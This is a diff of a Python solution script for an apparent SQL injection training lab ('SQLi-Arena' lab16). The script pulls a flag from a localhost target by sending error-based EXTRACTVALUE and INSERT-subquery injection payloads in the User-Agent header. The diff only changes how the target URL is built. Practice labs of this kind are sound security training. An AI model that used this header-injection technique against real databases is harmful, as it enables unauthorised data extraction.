@@ -6,16 +6,16 @@ Extracts the system key via EXTRACTVALUE error-based injection
 in the HTTP User-Agent header, which is logged to the database.
 
 Usage:
-    python3 lab16_header_useragent.py [TARGET_URL]
+    python3 lab16_header_useragent.py [BASE_URL]
 
-Default target: http://localhost/SQLi-Arena/public/lab.php
+Default target: http://localhost/SQLi-Arena
 """
 import requests
 import sys
 import re
 
-TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
-PARAMS = {"lab": "mysql/lab16", "mode": "black"}
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost/SQLi-Arena"
+TARGET = f"{BASE}/mysql/lab16"
 
 
 def extract_via_extractvalue():
@@ -30,7 +30,7 @@ def extract_via_extractvalue():
     print(f"    {payload}")
     print()
 
-    r = requests.get(TARGET, params=PARAMS, headers={"User-Agent": payload})
+    r = requests.get(TARGET, headers={"User-Agent": payload})
 
     # Look for XPATH error containing the flag (handle HTML entities)
     import html as html_mod
@@ -62,7 +62,7 @@ def extract_via_insert_subquery():
     print(f"    {payload}")
     print()
 
-    r = requests.get(TARGET, params=PARAMS, headers={"User-Agent": payload})
+    r = requests.get(TARGET, headers={"User-Agent": payload})
 
     match = re.search(r"FLAG\{[^}]+\}", r.text)
     if match:
